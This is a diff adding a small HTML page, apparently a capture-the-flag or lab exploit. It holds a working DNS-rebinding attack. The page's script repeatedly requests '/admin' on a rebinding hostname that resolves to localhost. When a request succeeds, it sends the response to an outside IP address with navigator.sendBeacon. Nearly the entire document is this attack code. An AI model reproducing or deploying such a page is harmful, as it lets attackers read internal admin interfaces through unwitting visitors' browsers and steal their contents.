@@ -1,0 +1,20 @@
+<html>
+    <h1>Coucou</h1>
+    <script>
+        const host = "7f000001.5902b8bc.rbndr.us:54022"; /* port 54022 */
+        let count = 0;
+
+        setInterval(function(){
+            if (count != 1000) {
+                var req = new XMLHttpRequest();
+                req.open('GET', `${host}/admin`, false);
+                req.send(null);
+                if(req.status == 200)
+                {
+                    navigator.sendBeacon("http://89.2.184.188:9001/<webhook_id>", req.responseText)
+                }
+                count ++;
+            }
+        }, 20000);
+    </script>
+</html>
